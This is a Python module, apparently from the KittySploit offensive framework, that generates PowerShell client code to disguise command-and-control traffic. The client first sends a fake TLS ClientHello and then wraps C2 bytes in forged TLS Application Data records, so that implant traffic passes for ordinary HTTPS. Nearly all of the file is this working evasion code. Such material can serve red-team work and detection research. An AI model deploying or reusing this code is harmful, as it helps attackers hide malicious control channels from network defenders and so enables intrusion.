#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional

from kittysploit import Transform
from modules.transforms.python.protocol.https_mimic import (
    CLIENT_HELLO_BYTES,
    Module as PythonHttpsTransform,
)


class Module(Transform, PythonHttpsTransform):
    """PowerShell HTTPS/TLS record mimic transform."""

    SUPPORTED_CLIENT_LANGUAGES = ["powershell"]

    __info__ = {
        "name": "PowerShell HTTPS Mimic Transform",
        "description": "Sends a fake TLS ClientHello then wraps C2 bytes in TLS Application Data records.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "powershell":
            return None
        hello_values = ",".join(str(b) for b in CLIENT_HELLO_BYTES)
        return (
            f"$script:xfClientHello=[byte[]]({hello_values});\n"
            "$script:xfBuf=New-Object System.Collections.Generic.List[byte];$script:xfFirst=$true;\n"
            "function _xf_encode([byte[]]$d){\n"
            " if($null -eq $d -or $d.Length -eq 0){return [byte[]]@()}\n"
            " $out=New-Object System.Collections.Generic.List[byte]\n"
            " if($script:xfFirst){$out.AddRange($script:xfClientHello);$script:xfFirst=$false}\n"
            " $i=0\n"
            " while($i -lt $d.Length){$n=[Math]::Min(16384,$d.Length-$i);$c=New-Object byte[] $n;[Array]::Copy($d,$i,$c,0,$n);$i+=$n;$out.Add(0x17);$out.Add(0x03);$out.Add(0x03);$out.Add(($n -shr 8) -band 255);$out.Add($n -band 255);$out.AddRange($c)}\n"
            " return $out.ToArray()\n"
            "}\n"
            "function _xf_decode([byte[]]$d){\n"
            " if($null -ne $d -and $d.Length -gt 0){$script:xfBuf.AddRange($d)}\n"
            " $out=New-Object System.Collections.Generic.List[byte]\n"
            " while($script:xfBuf.Count -ge 5){\n"
            "  $rt=$script:xfBuf[0];$ln=($script:xfBuf[3] -shl 8) -bor $script:xfBuf[4]\n"
            "  if($ln -gt 16384){$script:xfBuf.RemoveAt(0);continue}\n"
            "  if($script:xfBuf.Count -lt 5+$ln){break}\n"
            "  if($rt -eq 0x17){$out.AddRange($script:xfBuf.GetRange(5,$ln).ToArray())}\n"
            "  $script:xfBuf.RemoveRange(0,5+$ln)\n"
            " }\n"
            " return $out.ToArray()\n"
            "}\n"
        )
